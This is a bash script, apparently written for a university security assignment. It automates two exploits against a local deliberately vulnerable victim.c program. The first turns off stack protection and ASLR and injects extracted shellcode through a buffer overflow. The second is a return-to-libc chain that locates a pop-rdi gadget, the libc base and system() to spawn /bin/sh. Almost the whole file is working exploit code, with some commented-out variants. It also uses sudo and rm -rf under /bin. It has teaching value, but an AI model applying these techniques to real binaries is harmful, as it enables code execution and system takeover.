#This bash script attacks our victim.c program

#if install exists remove installation files

#NOTE: the rm needs an try and except because if the system hasn't run the script before. It will give an error.
rm /bin/libc_attack -f -r

printf "We will now install the prelink and GitHubpackage"

#If some packages cannot be found, you need to update the system. Uncomment the next line.
#sudo apt-get update
sudo apt-get install prelink git -y

#create an install folder

mkdir /bin/libc_attack/


#download de source code van github

git clone https://github.com/rjanssen96/oss_assignment2 /bin/libc_attack/

#Show that the files are downloaded
printf "The files are downloaded and placed in /bin/libc_attack \n"

ls /bin/libc_attack/

printf "\n"

#Compile the attacking program
gcc /bin/libc_attack/shell.c -o /bin/libc_attack/a.out

printf "We have compiles shell.c, it is stored as a.out \n"

ls /bin/libc_attack/

printf "\n"

#Run the attacking program, to get it into the memory
printf "We will run the program press enter to continue... \n"

printf "Type exit to continue... \n"
/bin/libc_attack/a.out

#Below we assign the starting and end- point of the code in binary to $needle0 and $needle1
#needle0=$(objdump -d /bin/libc_attack/a.out | sed -n '/needle0/,/needle1/p' | grep needle0 | awk -F ' ' '{print $1 }' | tail -c 4)

needle0=$(objdump -d /bin/libc_attack/a.out | sed -n '/needle0/,/needle1/p' | grep needle0 | awk -F ' ' '{print $1 }' )

echo $needle0

needle1=$(objdump -d /bin/libc_attack/a.out | sed -n '/needle0/,/needle1/p' | grep needle1 | awk -F ' ' '{print $1 }' )

echo 0x$needle1


#I skipped this part because of the roundin"

bytes=$(echo $(($(echo 0x$needle1)-$(echo 0x$needle0))))

echo "The array exits of $bytes bytes"

#It is possible to extend the script here by checking the bytes and round them to bytes. Because of time issues we have chosen to create a static value of 32 bytes
roundedbytes=32
hexneedle='0x'$needle0

echo "Rounded bytes $roundedbytes"
xxd -s$(echo 0x$needle0) -l$(echo $roundedbytes) -p /bin/libc_attack/a.out /bin/libc_attack/shellcode
#xxd -s$hexneedle -l32 -p /bin/libc_attack/a.out /bin/libc_attack/shellcode

printf "This results in the following 32 bytes: \n"

cat /bin/libc_attack/shellcode


#Now compile the victim program and launch it

gcc -fno-stack-protector -o /bin/libc_attack/victim /bin/libc_attack/victim.c

printf "Victim program is compiled \n"

printf "We now have the following files: \n"

ls /bin/libc_attack

#Disable executable space prtection

#NOTE: It could be that the script fails on the next command if execstack is an unknown command. Then some extra packages need to be added in the begin

#UNCOMMENT ThE LINE BELOW IF YOU WANT TO DO THE FIRST ATTACK
execstack -s /bin/libc_attack/victim


#Disable ASLR and run the victim program
printf "Press enter to continue...\n"
setarch `arch` -R /bin/libc_attack/victim &> /bin/libc_attack/victim_log

printf "We now have the location of the program without changing the original source code \n"

ls /bin/libc_attack/

#The address below is the hex value of the variable Name in the victims program
victim_address=$(cat /bin/libc_attack/victim_log | head -n 1)

echo "The address of the variable Name from the victims program is:" $victim_address

#Now transform the victims location into little-endian notation

littleendian=$(printf %016x $victim_address | tac -rs..)

echo "We have convert the Name pointer into Little-Endian syntax: " $littleendian

#Now we will attack our vulnerable program


#NOTE: the 80 zero's are not correct, regarding to the script in the assignment. I changed the victims script to a buf of 64

#Uncomment the two lines below if you want to launch the first attack in the tutorial.
printf "\n\n!!!We will now attack the program!!!\n\n"

(( cat /bin/libc_attack/shellcode ; printf %0514d 0 ; echo $littleendian ) | xxd -r -p ; cat ) | setarch `arch` -R /bin/libc_attack/victim








#Now we are going to use Libc

#We can first locate the libc and then based on the kernel select the libc library. For instance with the uname command you know which kernel is used.But because of time issues we were not able to do this.

#find the pointer for a gadget
gadget_address=0x$(xxd -c1 -p /lib/x86_64-linux-gnu/libc.so.6 | grep -n -B1 c3 | grep 5f -m1 | awk '{printf"%x\n",$1-1}')

echo "The gadget has the following address: " $gadget_address


#Run the victims program in the background

#printf "Typ ctrl+z to run the program in the background"

#create new bash file for running the victims program
###echo "setarch `arch` -R /bin/libc_attack/victim" > /bin/libc_attack/run_victim.sh
###chmod 755 /bin/libc_attack/run_victim.sh

###printf "Press ctrl+z to run the victims program in the background, and wait a second"
###/bin/libc_attack/run_victim.sh
###bg


#Now we are looking for the address of Libc

printf "\nRun on a second terminal the victims program: /bin/libc_attack/victim \n"

printf "If you have started the program \n"

read -p "Press enter to continue..."

#First we look for the proces id of the victim program and then look for the Libc address

pid=$(ps -C victim -o pid --no-headers | tr -d ' ')
#Grep the output and find the starting address for Libc, -m1 prints the first line, '-' {print $1} prints the first column seperated by -
libc_location=$(grep libc-2 /proc/$pid/maps -m1 | awk -F '-' '{print $1}')
libc_address=0x$libc_location

echo 'The libc address is: '$libc_address

#libc_address='0x'$libc_location'0x'$gadget_location
#libc_address=$(('0x'$libc_location+'0x'$gadget_location))
#echo 'The final address will be: ' $libc_address

#The /bin/sh address is still available under $victim_location

#Next we will locate the system library function, the tail -c 5 prints only the last 5 characters
system_function_location=$(nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep '\<system\>' | awk -F ' ' '{print $1}' | tail -c 6)

system_function_address=0x$system_function_location

echo 'The system location is: '$system_function_location

#system_function_address=$((0x$(echo($libc_location)0x$(echo $system_function_location))))
echo 'The system function address is: ' $system_function_address

printf "show printf values\n"

printf "\nLibc address + gadget address\n"
printf %016x $(($(echo $libc_address)+$(echo $gadget_address))) | tac -rs..
printf "\nVictims address \n"
printf %016x $(echo $victim_address) | tac -rs..
printf "\nLibcaddress and system function address\n"
printf %016x $(($(echo $libc_address)+$(echo $system_function_address))) | tac -rs..


(echo -n /bin/sh | xxd -p; printf %0514d 0;
printf %016x $((libc_address+gadget_address))| tac -rs..;
printf %016x $((victim_address)) | tac -rs..;
printf %016x $((libc_address+system_function_address)) | tac -rs..) | xxd -r -p | setarch `arch` -R /bin/libc_attack/victim

#(echo -n /bin/sh | xxd -p; printf %0130d 0;
#printf %p $(($system_function_address+$gadget_location)) | tac -rs..;
#printf %p $victim_location | tac -rs..;
#printf %p $(($system_function_address+$system_function_address)) | tac -rs..) | xxd -r -p | setarch `arch` -R /bin/libc_attack/victim

#echo finding libc base address...
#cat > /bin/libc_attack/findbase.c << "EOF"
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#int main() {
#  char cmd[64];
#  sprintf(cmd, "pmap %d", getpid());
#  system(cmd);
#  return 0;
#}
#EOF
#gcc -o /bin/libc_attack/findbase /bin/libc_attack/findbase.c

#addr=$(echo | setarch $(arch) -R /bin/libc_attack/victim | sed 1q)

#libc="/lib/x86_64-linux-gnu/libc.so.6"
#base=0x$(setarch `arch` -R /bin/libc_attack/findbase | grep -m1 libc | cut -f1 -d' '| awk -F ':' '{print $1}')
#echo ...base at $base
##system=0x$(nm -D $libc | grep '\<system\>' | cut -f1 -d' ')
#echo ...system at $system
#exit_add=0x$(nm -D $libc | grep '\<exit\>' | cut -f1 -d' ')
#echo ...exit at $exit_add
#gadget=0x$(xxd -c1 -p $libc | grep -n -B1 c3 | grep 5f -m1 | awk '{printf"%x\n",$1-1}')
#echo ...push-RDI gadget at $gadget

#echo exploiting victim...
#( (
#echo  -n /bin/sh | xxd -p
#printf %0130d 0
#printf %016x $((base+gadget)) | tac -rs..
#printf %016x $((addr)) | tac -rs..
#printf %016x $((base+system)) | tac -rs..
#printf %016x $((base+exit_add)) | tac -rs..
#echo
#) | xxd -r -p ; cat) | setarch `arch` -R /bin/libc_attack/victim
